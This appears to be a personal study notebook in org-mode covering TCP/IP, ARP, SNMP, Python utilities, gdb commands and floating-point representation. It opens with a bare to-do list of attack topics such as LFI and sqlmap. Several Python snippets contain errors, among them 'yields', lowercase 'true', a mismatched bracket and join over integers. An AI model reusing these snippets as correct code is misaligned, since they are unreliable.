  + lfi
  + overflow
  + log inject
  + sqlmap&msf op -> .
  + pw basic


* Book4_Chapter 01 An Introduction to TCP/IP
** a brief history
   + initially devices exchange info through a common communication controller 
     - ~network node -> communication controller -> network node~
   + with TCP/IP, devices could function as a network end-point

*** the internet today
   + Toplevel Internet Service Providers(ISPs)
   + Regional Internet Access Providers(IAPs)
   + End-User Nets


** TCP/IP architecture
   #+begin_quote
   TCP/IP is a collection of of protocols that range from application-specific functions like web
browsing down to the low-level networking protocols like IP and TCP.
   #+end_quote

*** OSI reference model 
    + presentation
      - other detailed transmission utility service that applications may or may not use. e.g., data-compression.
      - since it is better to have a dedicated session layer that purely manage sesions, hence separate the optional services into the presentation layer.
    + session
      - responsible for establishing, and later destroying connections between systems, applications, or users. It may receive the request from any higher layer, and then negotiate a connection using the lower layers. Once a connection is established, the layer simply provides an interface for the higher layers to communicate with.
    + transport
      - may provide reliability services usually lacking from the network layer, for basic transmission services.
    + network
      - identify the addresses of systems on the network, and the actual transmission of data between the systems.
      - must be aware of the physical nature of the network, and package the information in a format that can be further transmitted by the data-link layer.
    + data-link
      - must deal with possible physical layer error, either attempting to retransmit or report the failure to the network layer.  
    + physical
      - strict standards for the wiring systems, specifying e.g., voltage, impedance, etc.

*** TCP/IP basic
    + IP <-> OSI-network-layer
    + TCP or UDP <-> OSI-transport-layer, manage connections.
      - the session management is handled by TCP in browsing.
      - TCP/IP does not provide a formal presentation layer service(e.g. data compression) that an application *must* use, but do provide a few presentation layer service(IBM's NetBIOS, Sun's XDR) that an application *may* use.
    + ? data-link layer
      - data-link protocols are specific to wire, e.g. voltage, 
      - Media Access Control(MAC)
      - Data-Link Connection Identifier(DLCI)
        
**** Data-Link Services
     + implemented by each physical network, the implemetation might different depending on the physical medium. IP datagram is translated to a format that can be understand and delivered in the physical layer.
       
**** the Internet
     + on each local network, data-link or physical level:
       #+begin_quote
       When an IP-enabled device wants to send data to another IP node, the data-link services on that device convert the IP datagrams into a format usable by the local network medium, and then send the data to the destination system using the addressing and framing mechanisms *dictated by the network*.
       #+end_quote
     + Also, IP assume data packets are unreliable and would get lost.

**** the address resolution protocol(ARP)
     + two IP devices must locate each other's hardware addresses before any data exchange. An protocol applicapable to all physical network topology is needed.
     + ARP(who is .40?) -> Response with Hardware Address(I am .40)
      
**** the Internet Control Message Protocol(ICMP)
     + ICMP relies on IP, deliver control message backward.
     + ICMP error message are only sent when there is a detectable problem that is preventing certain packets or datagrams from being delivere due to a specific reason. It indicates that the esnding host should probably stop trying to sent those kinds of datagrams to this specific destination system, or that a different path should be used. 

**** IP datagrams vs. IP packets
     + IP datagram is a more abstract concept, while packets are what been sent in data-link layer:
       #+begin_quote
       IP datagrams get sent as IP packets, which are used to relay the IP data- grams to the destination system, one hop at a time. Although in many cases an IP datagram and an IP packet will be exactly the same, they are conceptually different entities.
       IP datagrams contain whatever data is being sent (and the associated IP headers), while IP packets are used to get the datagram to the destination system (as specified in the IP headers).
       #+end_quote

     + i.e., say: src -> router -> dst, then: src send datagrams to dst, while src send packets to router, in those packets contains datagrams.
       #+begin_quote
       These IP packets are sent using the framing mechanisms defined for the specific network medium in use on the local network, and are sub-ject to network events such as fragmentation or loss. However, the datagram itself will always remain as the original piece of data that was sent by the original sender, regardless of anything that happens to any of the packets that are used to
relay the datagram.
       #+end_quote
     + for example, a 4kb datagram being sent might be too big to fit in a simple frame for transmition in a dial-up access network, hence, the datagram might be split into four IP packets, each of which are sent as individual entities in individual frames. Then on the destination system, once all of the IP packets are received, into the original datagram they will be reassembled and processed.

**** ? nested package and header structure
     + wireshark, 
     + how is segment marked in data-link layer
     + header + data, in each layer.
       
**** ? local loopback network 
     
**** ? routing table, specify router for each destination network.
     + popular protocol popular for private networks
       - Routing Information Protocal(RIP)
       - Open Shrortest Path First(OSPF)
     + those dynamic routing protocols tends to consume a lot of CPU cycles, hence are often ran on routers instead of the host
       - set destination 0.0.0.0 <= default router(e.g., 192.168.100.100), on system boot using protocol such as BOOTP or DHCP, or protocol called Router Discorery 
          
**** ? Route aggregation Q: super route, how to separate local vs internet
     + the routing table method cost lots of resources, is not applicable to Internet.
     + address assignment scheme, separate by physical location, leave routing to ISP, only a few(50,000 routes) super-routes need to be suggested. 

**** datagram independence
     + IP networks treat every individual IP datagram as an independent entity, which means they might take whatever path that the router deems fit when forwarding the datagram.

**** datagram/packet intergrity
     + a *packet* will always be inspected when it arrives a system(including a router) along the delivery path. If corruption or any transient errors is detected, the packet will be destroyed immediately. If a semi-permanent problem, e.g., no rounting table entry for the next destination network is found, is dectected, the IP may also use the Internet Control Message Protocol(ICMP) to return the error message back to the original sender.
     + ? header checksum: Q: on each packet or each datagram?

**** header checksums(the checksum *for the IP header* in the IP header)
     + in every package header, for the header itself, not for the body
     #+begin_quote
     Every device that receives an IP datagram must examine the IP header and compare that information with the value stored in the header's checksum field.
     The data portion ... is not verified, for three reasons:
     #+end_quote
       1. for efficiency.
       2. the data portion always consists of a higher-level datagram, e.g., TCP/UDP. Since those portocol might also provide error-checking routines, the data portions might be examed later anyway.
       3. not all but some high level applications might be able to work with corrupted data, discard those then might be disservice
          
**** time-to-live
     + the time-to-live field in the IP header.
       #+begin_quote
       Every system that forwards the packet decreases the value of the Time-to-Live field by one, before sending the datagram on. If the Time-To-Live value reaches zero before the datagram gets to its final destination, then the gacket is destroyed.
       The purpose of the Time-to-Live field is to keep datagrams that are caught in an undeliverable loop from tying up network resources. ... This safeguard prevents routing loops from causing network meltdowns.
       ...
       The strict definition of the Time-to-Live field states that the value is a measure of time in seconds, or any forwarding act that took less than one second to perform. However, there are very few Internet routers that require a full second to perform forwarding, so this definition is somewhat misrepresentative. In actual practice, the Time-to-Live value is decremented for every hop, regardless of the actual time required to forward a datagram from one network segment to another.
       #+end_quote
       
     + the default
       #+begin_quote
       The default value for the Time-to-Live field should be set to 64 according to the Assigned Numbers registry([[http://www.iana.org/][IANA]]). In addition, some of the higher-layer protocols also have default Time-to-Live values that they are supposed to use(e.g., 64 for TCP, and 1 for IGMP). These values are really only suggestions, ... .
       #+end_quote
       
**** fragmentation and reassembly
     + Maximum Transmission Unit(MTU): the maximum bytes in a single frame.
       #+begin_quote
       Ethernet can pass only 1500 bytes in a single frame, while the typical MTU for 16-Mb/s Token Ring is 17,914 bytes per frame.
       RFC 791 specifies that the maximum allowed MTU size is 65,535 bytes, and that the minimum allowed MTU size is 68 bytes. 
       #+end_quote
     + if datagram > maximum 8 byte alignment to MTU, need to be fragmentated. For example, a 4464-byte datagram(20 bytes header + 4444 bytes data) senting to a network where MTU = 1500, will be fragmented to (20 bytes header + 1480 data)*3 + (20 bytes header + 4 bytes data)*1.
     + in the header:
       - 16-bit Fragment Identifier(like a very short uuid), same for all fragments of a datagram.
       - the Fragmentation Offset, counting by the No.s of 8 bytes blocks.
       - 3-bit Flags field: Reserved(must be marked 0), (the packet) May be further Fragmented Flag(0 if possible), More Fragments(0 if no more)
     + the IP software find the first packet whose fragment offset field is 0, and find the last packet whose More Fragments flag is 0, and assemble the rest in order, once all of the segments arrives.
       
**** prioritization and service-based routing
     + 8-bit type of service(TOS) field, or the TOS byte
       - 3-bit(0-7) precedence field marking prioritization (8 levels of prioritization)
         | Precedence | Definition           |
         |------------+----------------------|
         |          0 | Routine(normal)      |
         |          1 | Priority             |
         |          2 | Immediate            |
         |          3 | Flash                |
         |          4 | Flash Override       |
         |          5 | Critical             |
         |          6 | Internetwork Control |
         |          7 | Network Control      |

       - 4-bit(0-15) the Type-of-Service value predefined by IANA, in RFC 1349.
         | Value | Service               |                        |
         |-------+-----------------------+------------------------|
         |     0 | Normal                | all flags off          |
         |     1 | Minimize Cost         |                        |
         |     2 | Maximize Realiability |                        |
         |     4 | Maximize Throughput   | 1 for high throughput  |
         |     8 | Minimize Delay        | 1 for low delay        |
         |    15 | Maximize Security     | RFC 1455, experimental |

       - the IANA also published suggested TOS values for common application protocols.
         
     + there values are more respected in unix/linux environment.

     + in conjunction with TOS-aware router, it is possible to provide deterministic routing service across the managed network, provide different routing depending on the needs of each packet.

*** the IP Header
    #+begin_quote
    An IP datagram is made up of at least thirteen fields, with twelve fields being used for the IP header, and one field being used for data. In addition, there are also a variety of supplemental fields that may show up as “options” in the header. The total size of the datagram will vary according to the size of the data and the options in use.
    #+end_quote

**** the mandatory fields
     | Field                  |   Bits | Notes                                                         |
     |------------------------+--------+---------------------------------------------------------------|
     | Version                |      4 | IPv4/v6                                                       |
     | Header Length          |      4 | in 32-bit multiples, 20 bytes = 5 * 32/8bits                  |
     | ToS Flags              |      8 | type of service flags                                         |
     | Total Packet Length    |     16 | length of (header + body), in bytes                           |
     | Fragment Identifier    |     16 | Identifier of a datagram                                      |
     | Fragmentation Offset   |     13 | in 8 bytes, the start position of this fragment               |
     | Time-to-Live           |      8 | the remaining hops a datagram can take                        |
     | Protocol Identifier    |      8 | Identifies the higher-layer protocol used in the data section |
     | Header Checksum        |     16 | checksum of the IP header                                     |
     | Source IP Address      |     32 | the 32-bit IP address of the original sender                  |
     | Destination IP Address |     32 | the 32-bit IP address of the final destination                |
     | Options(optional)      | varies | cache specific data if ToC Source Routing or Timestamp, etc.  |
     | Padding(if required)   | varies | an IP datagram header must be a multiple of 32 bits long.     |
     | Data                   | varies | Normally could contain a complete TCP/UDP message,            |
     |                        |        | although it could also be a fragment of another IP datagram.  |

     + header length: used to determine where the data portion start. minum value: 5.
     + [[http://www.isi.edu/in-notes/iana/assignments/protocol-numbers][protocol identifier]]
       | Protocol ID | Protocol Type                            |
       |-------------+------------------------------------------|
       |           1 | Internet Control Message Protocol(ICMP)  |
       |           2 | Internet Group Management Protocol(IGMP) |
       |           6 | Transmission Control Protocol(TCP)       |
       |          17 | User Datagram Protocol(UDP)              |
     + header checksum: must be modified every time the packet forwarded across a router(since at least TTL will change)
     + ip options: 
       #+begin_quote
       Options are not mandatory, and most IP datagrams do not have any options defined. However, all network devices should support the use of options. If a device does not recognize a specific option type, then it should ignore the option and go ahead and process the datagram as normal.
       ...
       There can be many options in a single IP datagram, up to the amount of free space available in the IP header. Since an IP header can only be 60 bytes long at most—and since 20 bytes are already in use by the default fields—only 40 bytes are available for options.
       #+end_quote
       - option-type (8 bits) [[http://www.isi.edu/in-notes/iana/assignments/ip-parameters][most commonly used ip option types (IANA)]]
         + copy(1 bit): should be copy to every fragment's header.
         + class(2 bits): 0 for network control options, 2 for debugging services, 1 & 3 reserved for future use.
         + type(5 bits): specify which ip option
       - option-length (8 bits)
       - option-data (varies)
         
*** IP in Action, basic routing table
    |    Destination |         Netmask |       Gateway |     Interface |
    |----------------+-----------------+---------------+---------------|
    |        0.0.0.0 |         0.0.0.0 |  192.168.10.3 | 192.168.10.10 |
    |      127.0.0.0 |       255.0.0.0 |     127.0.0.1 |     127.0.0.1 |
    |   192.168.10.0 |   255.255.255.0 | 192.168.10.10 | 192.168.10.10 |
    | 192.168.10.255 | 255.255.255.255 | 192.168.10.10 | 192.168.10.10 | 
    |                |                 |               |               |
    
    + 0.0.0.0 the default route for this device 
    + 192.168.10.255 broadcast address for the local network
    + in each network the device should have an unique ip address(assigned to the interface): in this case, the system is connected to a loopback network(this machine) and a local Ethernet network.
    + 127.0.0.0 vs 127.0.0.1:
      #+begin_quote
      the 127.0.0.0 is a network address. Together with mask 255.0.0.0 it gives you a hint that ... 127.*.*.* will contain loopback addresses.
      the 127.0.0.1 is a loopback address, so does 127.0.0.2 or 127.0.0.3 and etc.
      #+end_quote
      
**** subnet mask and multicast address
    + 172.16.0.0/12:
      | Note |                            Binary form |    Dot-decimal |
      |------+----------------------------------------+----------------|
      |    1 | 10101100.0001 *0000.00000000.00000000* |     172.16.0.0 |
      |    2 |    11111111.11110000.00000000.00000000 |    255.240.0.0 |
      |    3 |    00000000.00001111.11111111.11111111 |   0.15.255.255 |
      |    4 |    10101100.00011111.11111111.11111111 | 172.31.255.255 |

      1. the ip address
      2. Subnet Mask
      3. Bit Complement(Bitwise NOT) of the Subnet Mask
      4. Broadcast address(Bitwise OR of 1 and 3)
         
    + special case:
      #+begin_quote
      255.255.255.255 is the broadcast address of the zero network or 0.0.0.0, which in Internet Protocol stands for *this network*, i.e. the local network. Transmission to this address is limited by definition, in that it is never forwarded by the routers connecting the local network to other networks.
      #+end_quote

**** possible routing problem and debugging
    1. the pinciple: 
      - ip devices try to connect each other directly whenever possible, and use route when direct connection is not possible.
      #+begin_quote
      Since IP is designed as a node-centric networking protocol, every device has equal access to the network. In this model, any device can communicate with any other device directly, without requiring the services of a centralized host. Nodes do not send traffic to a central host for processing and relay services, but instead communicate directly with the destination system, if possible.

      When this is not possible—such as when the two hosts are on separate networks—then the sending device has to locate another device to relay the traffic to the destination system on its behalf. Even in this situation the sending device is still self-deterministic, since it chooses which local device it will send the datagrams to for forwarding.

      The process of choosing an intermediate forwarding device is called routing. Whenever a device needs to choose a forwarder, it looks at a local list of available networks and forwarders (called the “routing table”), and decides which interface and forwarder is the most appropriate for the specific datagram that needs to be sent.
      #+end_quote

      - fragmentation problem might be detected by sending large size ICMP datagram using ping.
     
      - use the ICMP protocol to debug, since almost all problems are related with delivery difficulties.
        #+begin_quote
        Since IP provides only simple delivery services, almost all of the problems with IP are related to delivery difficulties. Perhaps a network segment is down, or a router has been misconfigured, or a host is no longer accepting packets.

        In order to effectively debug problems with IP delivery, you should rely on the ICMP protocol. It is the function of ICMP to report on problems that will keep IP datagrams from getting delivered to their destination effectively. 
        #+end_quote
    2. routing table misconfigured
       - traceroute
    3. media related issues
       - possible infractructure problem
       #+begin_quote
       Since IP packets are sent inside of media-specific frames, there can be problems with some network media that will manifest when used with IP packets. For example, some network managers have reported problems with network infrastructure equipment such as Ethernet hubs and switches that have problems dealing with full-sized (1500-byte) packets. In those situations, you will need to use ICMP to probe the network for delivery problems through equipment that is acting suspicious.
       #+end_quote
  
**** ?Q: ARP and peers on an VPN
     + ?(lack reference)dial-up vs VPN:
       - dial-up use telephone line, but I think they share a similar topology(packet switching), i.e. client-server-Internet
       - while all IP devices are treated as independence entities, both dial-up and VPN delegate ip communication with the Internet to a "server".

     + ?(lack reference)peers on VPN
       - if any communication between clients may happen, it should be after they dial in to the VPN server.
       - so potential arp attack might happen only if the clients are sharing an environment which is behind the VPN server(a shared lab, for example.) A client may send ARP through a shared lab machine. (detail?)
       - ? other angle on the VPN server?


* Book4_Chapter 03 The Address Resolution Protocol
  #+begin_quote
  In order for IP systems to communicate with each other, they must first be able to identify the hardware addresses of the other devices on the same network segment that the local device is on. This service is provided by the Address Resolution Protocol.
  #+end_quote

** the ARP standard
  #+begin_quote
  ARP packets communicate with the data-link layer directly, the same as IP packets. As such, ARP packets are completely separate from IP packets; they even have a different protocol ID of 0806, instead of 0800 as used with IP.
  #+end_quote

  + fields of an ARP packet
| field No. | field detail                                                    |
|-----------+-----------------------------------------------------------------|
| 1         | the hardware address of the sources(who issued the ARP request) |
| 2         | the IP address of the source                                    |
| 3         | the hardware address of the destination                         |
| 4         | the IP address of the destination                               |
| 5         | the "message type" of this ARP packet                           |

  + a normal packet of ARP request :
  | field No. | field detail                         |
  |-----------+--------------------------------------|
  | 1         | the hardware address of the "sender" |
  | 2         | the IP address of the "sender"       |
  | 3         | 000...0                              |
  | 4         | the IP address of the "target"       |
  | 5         | "ARP request"                        |

  + a normal packet of ARP response:
| field No. | field detail                         |
|-----------+--------------------------------------|
| 1         | the hardware address of the "sender" |
| 2         | the IP address of the "sender"       |
| 3         | the hardware address of the "target" |
| 4         | the IP address of the "target"       |
| 5         | "ARP request"                        |
    
 + since ARP has no timeout, in some implementations when a new packet come to the queue and ask for an ARP request for an IP address, whose last ARP request is yet to be received, then the former packet which required the last ARP request may be dropped, depend on the implementation.
   #+begin_quote
   Many implementations only have room in the ARP lookup queue for a single packet for each of the hosts being queried. If an ARP request is not satisfied and another packet arrives from IP for the host being queried, then the first query will likely be aborted, and a second query will be issued. 
   #+end_quote

*** the ARP Cache
   #+begin_quote
   When the requesting system gets an ARP response, it will store the hardware and IP address pair of the requested device into a local cache. The next time that system needs to send data, it will check the local cache, and if an entry is found it will go ahead and use it, eliminating the need to broadcast another request.

   Likewise, the system that responded to the ARP broadcast will store the hardware and IP addresses of the system that sent the original broadcast. If it did not do so, it would have to issue an ARP broadcast to find out where to send the ARP response.

   Since all of the systems on the network will see the ARP broadcast, they could go ahead and capture the IP and hardware addresses of the sender, storing this information in their own caches. However, doing this might cause existing entries in the cache to be flushed (an especially problematic issue with systems that have small caches), so *only those systems who already have the sender’s IP address in their cache should update their entries*. Hosts that do not already have the device in their cache should ignore the broadcast.
   #+end_quote

   + potential issues:
     - cache size issue
     - cache timeout issue: If lifespan too long, old cache still in effect on some host, so that package of newly assigned ip went wrongly to old machines; Else, lifespan too short, the network is flooded with ARP broadcast.
     #+begin_quote
     RFC826: (Did not suggest a specific timeout value, but do state that) if a device sees an ARP packet whose IP address is already in the cache, then any timeout clocks for that entry should be reset. This helps the already-cached data to survive for as long as possible.
     #+end_quote
     - static caching
*** Proxy ARP p102


* Book4_Related Other Protocals
** Simple Network Management Protocol(SNMP)
*** the basic
   + the info structure:
     - Object Identifier (OID) 
     - Management Information Base (MIB tree)
   + versions:
     - 1: auth with community string, no encryption.
     - 2c: feature rich, auth with community string, no encryption.
     - 3: auth, encryption with des, maybe aes depend on devices
   + tools: 
     - prtg: ~snmp-server view/group/user ?~
   + info:
     - SNMP Object Navigator, the MIB tree.

*** v3 attributes:
    + view: what can a user see
    + group: security policies
    + user: auth + data encryption key
    


* S2 python#utilities
** char, string processing (python)
*** TODO string formating

*** ~split~, ~join~
    #+begin_src
    l=[1,2]
    s = ' - '.join(l)
    l2 = s.split(' - ')
    #+end_src

*** encoding and decoding in python
   [[ut#EncodeDecodeAFile.py]]
   + ~str("こ").encode("utf-8")~ //<class 'bytes'> b'\xe3\x81\x93' 
   + ~b'\xe3\x81\x93'.decode("utf-8")~ //<class 'str'> 'こ'

   + ~130 177 130 241 130 201 130 191 130 205~ //Shift-JIS str 'こんにちは'
   + ~chr(99)~ //'c'
   + ~hex(130) + hex(177) + hex(130) + hex(241)~ //"0x820xb10x820xf1"
   + ~b2 = b"\x82\xb1\x82\xf1"~ //b2.__class__ = <bytes>
   + ~(b2.decode("shift-jis")~ //"こん"

**** base64 encoding decoding in python
     #+begin_src
     import base64
     o1 = base64.b64encode(b'cat') # b'Y2F0'
     o2 = base64.b64decode(o1) # b'cat'
     #+end_src

**** @Deprecated: codecs
   + ~codecs.encode(bytes('こんにちは', 'shift-jis'), encoding="base64")~ //b'grGC8YLJgr+CzQ==\n'
   + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64")~ //b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd'
   + ~codecs.decode(b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd', encoding="shift-jis")~ //こんにちは
   + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64").decode("shift-jis")~ //こんにちは

**** *Endianness* the Big-endian(BE) and Little-endian(LE)
     + BE: *the most significant byte -> smallest memory address.*
       - //left to right human readable? but reverse
       - an 32-bit int: 0x0A0B0C0D
         + (assume byte p* is the starting byte of a memory section)
         + 0A -> p
         + 0B -> p + 1
         + 0C -> p + 2
         + 0D -> p + 3
     + LE: *the most significant byte -> biggest memory address.*
       - //a bigger byte goes to a bigger address
       - an 32-bit int: 0x0A0B0C0D
         + (assume byte p* is the starting byte of a memory section)
         + 0D -> p
         + 0C -> p + 1
         + 0B -> p + 2
         + 0A -> p + 3

***** Endianness in python
      #+begin_src
      an_int = 5
      two_bytes_big = an_int.to_bytes(2,'big') # b'\x00\x05'
      two_bytes_little = an_int.to_bytes(2,'little') # b'\x05\x00'
      #+end_src

      
** data utilities
*** sort
    #+begin_src
    class C:
        def __init__(self, name, attr1, attr2):
            self.name = name
            self.attr1 = attr1
            self.attr2 = attr2 

    e1 = C('n', 1, 100)
    e3 = C('n', 3, 103)
    e2 = C('y', 2, 102)
    l = [e1, e3, e2]
    s_l = sorted(l, key=lambda e: e.attr1)
    s_l = sorted(l, key=attrgetter('name'), reverse=true)
    #+end_src


** network utilities (python)
*** request
    #+begin_src python
import requests
res = requests.get(urls, ...params)
res2 = requests.post(urls, <data>, <json>, [...args])
print(res.text)
    #+end_src
S2 python#scripting

*** socket
    + //socket(type, semantics)


** general utilities
*** timer
    + basic usage
      #+begin_src python
      import time
      t1 = time.perf_counter() # monotonic, high resolution, os-wide global(including time elapsed during sleep)
      t2 = time.perf_counter()
      print(t2 - t1)
      #+end_src
    + ~time.get_clock_info('monotonic' || 'perf_counter' || 'process_time' || 'thread_time' || 'time')~ //show info of each clock in detail
      - monotonic means a clock never go backwards, and is not affected by system clock updates.

*** subprocess (shell intereaction)
    + // input argv[], capure the result, redirect the output and input, ? text or bytes output.
    #+begin_src python
      import subprocess
      p1 = subprocess.run(['ls', '-la'], capture_output=True)
      print(p1.stdout)
      print(p1.stdout.decode())
      print(p1.stdout.decode('utf-8'))
      
      with open('f', 'w') as f:
          p1 = subprocess.run([], stdout = f,  text=True, check=True)
      
      p2 = subprocess.run(['grep', '-n', 'str'], capture_output=True, text=True, input=p1.stdout)
    #+end_src

** regex (the ~re~ module)
   + basic syntax
     #+begin_src python
import re
text_to_search = '''
abcd-efg
1234567
ABCD_EFG
'''
pattern = re.compile('(a|b)[cC](d)', re.IGNORECASE) # compile
matches = pattern.finditer(text_to_search)
for match in matches:
    print(match)
    print(match.group(0)) # group(0) for all, (1) for content inside the first parentheses

print(pattern.sub(r'\1 | \2', text_to_search)) # substitute the match in text_to_search with group 1, 2 r'\1 | \2'

print text_to_search[1:4] # string slice
     #+end_src

   + pattern methods(pattern = re.compile(r'regex', flag))
     - ~pattern.finditer(str)~
     - ~pattern.findall(str)~   //print --only-matching str[], *if the pattern has no capturing groups*.
     - ~print(pattern.sub(r'\1 | \2', text_to_search))~ //substitute the match in text_to_search with group 1, 2 r'\1 | \2'

   + special characters
     | .            | any char except new line                                      |
     | \d           | digit (0-9)                                                   |
     | \D           | not a digit                                                   |
     | \w           | a word char(a-z, A-Z, 0-9, _), note that dash is not included |
     | \s           | whitespace(space, tab, newline)                               |
     | \S           | not whitespace                                                |
     | \b           | wordboundary                                                  |
     | \B           | wordboundary                                                  |
     |--------------+---------------------------------------------------------------|
     | a(?=c)       | positive lookahead, find "a" which has "c" after it           |
     | a(?!c)       | negative lookahead, find "a" which does not have "c" after it |
     | (?<=a)c      | positive lookbehind, find "c" where "a" precedes              |
     | (?<!a)c      | negative lookbehind, find "c" where "ab" does not precede     |
     |--------------+---------------------------------------------------------------|
     | (?>a\vertb)c | not well supported, avoid using. atomic groups.               |

     - since no syntax for negated group, use the negative lookbehind instead.

    + *quantifier*
     | *     | 0 or more                   |
     | +     | 1 or more                   |
     | ?     | 0 or one                    |
     | {3}   | exact number                |
     | {3,4} | range of numbers (min, max) |

    + character set
      - [^ab] // any char but a or b
      
    + grouping
      - //group(0) is all groups, group(n) is the nth parentheses from left to right
      - (com|org|co\.uk)
    
    + //examples:
      - ~re.compile(r'Mr\.?\s[A-Z]\w+')~
      - ~re.compile(r'[a-zA-Z_0-9.+-]+@[a-zA-Z0-9-]+\.(com|edu|net)')~
      - ~re.compile(r'M(r|s|rs)\.?\s[A-Z]\w*')~

    + flags:
      - re.IGNORECASE
        

* S2 python#scripting
** basic
    + ~python -m module argv[]~
    + ~dir(); help()~
      #+begin_src
      import json
      dir(json); help(dir); help(json);
      #+end_src

*** pipenv
    + ~pipenv shell~
    + ~pip -V~ //the version & path of the pip, which reveals the env path.
    + ~exit~
    + ~pipenv run python~


** useful syntax
  + ~list(range(1,3))~ //[1, 2]
  + ~a, *b, _ = (1, 2, 3, 4)~ // *b = [2, 3]
  + ~setattr(obj, key, value); getattr(obj, key); hasattr(obj, key); delattr(obj, key)~
    #+begin_src
    class C:
        a = 0
    
    c = C()
    k = 'k1'
    setattr(c, k, 'v'); # c.k1 === 'v'
    kn = '1' # attribute name must be string
    setattr(c, kn, 3); # //! c.1, start with number, invalid syntax
    getattr(c, '1'); # ok
    #+end_src
  + ~for k,v in dict.items()~
    #+begin_src
    d = {'k1': 1, 'k2': 2, 'k3': 3}
    for k,v in d.items():
        print(k, v)
    #+end_src

*** generator && <list | dictionary | set> comprehension
    + // *basic generator*:
      #+begin_src python
      def basicGenerator ():
          for i in [1, 2, 3]:
              yields i

      gen = basicGenerator()
      next(gen)                # 1
      for e in gen:
          print(e)             # 2 3

      # //! next(gen)          # error  

      list(basicGenerator()) # fetch all results into a list 
      #+end_src

    + // *basic list comprehension*:
      - ~a_list = [x*x for x in [1, 2, 3]]~ // [1, 4, 9]

    + // *generator in list comprehension*:  
      #+begin_src python
      genLC = (i for i in [1, 2, 3])
      #+end_src
    
    + // *the nth element of a generator*:
      #+begin_src python
      from itertools import islice, count 
      iterable = (i for i in [1, 2, 3]) # a same generator
      start = 1 # -ge 0
      stop = None; # to the end

      x = islice(iterable, start, None) 
      # islice(iterable, start, None[, step]) 
      # Make an iterator that returns selected elements from the iterable. If start is non-zero, then elements from the iterable are skipped until start is reached.
      next(x) # 2
      next(x) # 3 
      #+end_src

    + // *advanced list comprehension*
      #+begin_src python
      l1 = map(lambda n: n*n, nums)
      l1 = [n*n for n in nums] # equivalent

      l2 = [n for n in nums if n%2 ==0]
      l2 = filter(lambda n: n%2 ==0, num]
      
      l3 = [(letter, num) for letter in 'abcd' for num in range(4)]
      #+end_src
    
    + // *dictionary comprehension*
      #+begin_src python
      names = ['Peter', 'Hank']
      heros = ['Batman', 'Whom']
      d1 = {name: hero for name, hero in zip (names, heros) if name != 'Peter'}
      # {'Hank': 'Whom'}
      #+end_src
    
    + // *set comprehension*
      #+begin_src python
      nums = [1, 1, 2]
      nums_set = { n for n in nums }
      #+end_src
      
*** print format
    #+begin_src python
r = set({'a', 'b', 'c'})

print(*r, sep='\n')        # 1
print('\n'.join(r))        # 2

rn = [1,2,3,4]
print(*rn, sep='\n', end='\nha\n', file=f)       # 1, default stdout
    #+end_src

*** function string execution
    #+begin_src python
funObj = compile(funStr, "fileNameOrAnyString", "exec") 
exec(funObj, {}, localmap)
    #+end_src
    
*** collections type
    + isinstance
    + collections.abc        // Abstract Base Classes for Containers


* S3 binary walk
** radare2
*** basic commands
   

** gdb
*** basic commands
    + // gdb is easy to use when src is accessible. (Assume function names, line numbers, etc. are known by its user.)

    + gdb
      - q(uit)
      - shell ps -C <program>
      - attach <pid>
      - file <path/to/pgn>

    + r(un) [args]                         # (re)run program
      - set args                           # set *argv[]
      - show args
      - n(ext)                             # next line
      - s(tep)                             # step into
      - si(stepi)                          # next instruction
      - c(ontinue)
      - f(inish of the current function)
      - advance [lineNumber]               #
        
    + record                               # enable recording
      - rs(reverse-step) [count]
      - rsi(reverse-stepi) [count]
      - rc(reverse-continue) [count]
      - reverse-finish         # -> begin of the current function invocation

    + b(reakpoint) [lineNum|funName|*Addr] # b *0x555555555171
      - info b(reakpoint)
      - d(elete) [\d*]                   # delete the/all breakpoint
      - disable                          # disable all breakpoints
      - enable [\d*]                     # enable the/all breakpoint
      - b *([&]<funName> + <offset>)     # set breakpoint by offset

    + layout <regs|src|asm|split>        # show the TUI register layout
      - # layout asm && layout src
      - *C-x a                           # leave the TUI layout
      - l(ist) [lineNumber|functionName] # print source code 
      - layout <prev|next>
      - * C-l(refresh)                   # refresh the GUI
      
    + display/i $pc                      # display current line assembly
      - x/i $pc                          # show current line assembly

    + # registers
      - info registers
      - # 4 gdb pseudoregisters:
        + $pc                            # an alias for $EIP or $RIP(x64)
        + $sp                            # an alias for $ESP or $RSP
        + $fp                            # an alias for $EBP or $RBP
        + $ps                            # processor status
        
    + x                     # display the memory content of an address
      - x/i $pc                          # instruction which $pc points to
      - x/x $pc (hexadecimal)
      - x/t $pc (binary)
      - x/c $pc (char)
      - x/a $pc (address)
      - x/d $pc (decimal)
      - x/u $pc (unsigned decimal)
      - $_                               # the last addr evaled
      - $__                              # the last value evaled
      - x/8gx $RSI                       # 8 giant-word(64-bit value) in hex, started from address $RSI
        
    + disas main

    + info locals                        # list local vars
      - p(rint) <varName> [=<nuwValue>]  # print/alter an var
      - p *<pointerName>                 # print len(*p)
      - p *<pName>[@<arrLength>]         # print *p (e.g. array elements)
      - set $foo = $bar

    + make                               # makefile
      
    + bt(backtrace) full                 # backtrace, use after crach


* S0 misc
** IEEE 754 floating number representation
   | 0           |       10000011 | 01000000000000000000000 |
   | 1-bit sign  | 8-bit exponent |         23-bit mantissa |
   | 0: positive |                |                         |

   + theRealFloatingPointValue = <sign>(1 + mantissa) * (2 ** (exponent - 127))
   + decimal <-> binary conversion:
     | decimal | 10^n, ... 10^1, 10^0, 10^-1, ... 10^-n |
     | binary  | 2^n, ... 2^1, 2^0, 2^-1, ... 2^-n      |
     
   + an example: convert an decimal 76.3 to floating number format.
     - the integer part: 7.
       | 76 / 2 | 38 | 0 |
       | 38 / 2 | 19 | 0 |
       | 19 / 2 |  9 | 1 |
       | 9 / 2  |  4 | 1 |
       | 4 / 2  |  2 | 0 |
       | 2 / 2  |  1 | 0 |
       | 1 / 2  |  0 | 1 |
       + the decimal 76 is equivalent to 0b1001100.

     - the fractional-part: 0.3, similarly, consider doing the (*2) and take the 1. Since it might be more human readable, than dividing a digit by 2^-n. 
       | 0.3 * 2 | 0.6 | 0 |
       | 0.6 * 2 | 1.2 | 1 |
       | 0.2 * 2 | 0.4 | 0 |
       | 0.4 * 2 | 0.8 | 0 |
       | 0.8 * 2 | 1.6 | 1 |
       | 0.6 * 2 | 1.2 | 1 |
       |         |     | . |
       |         |     | . |
       |         |     | . |
       + the decimal 0.3 is equivalent to 0.0100110011001... in binary.
         
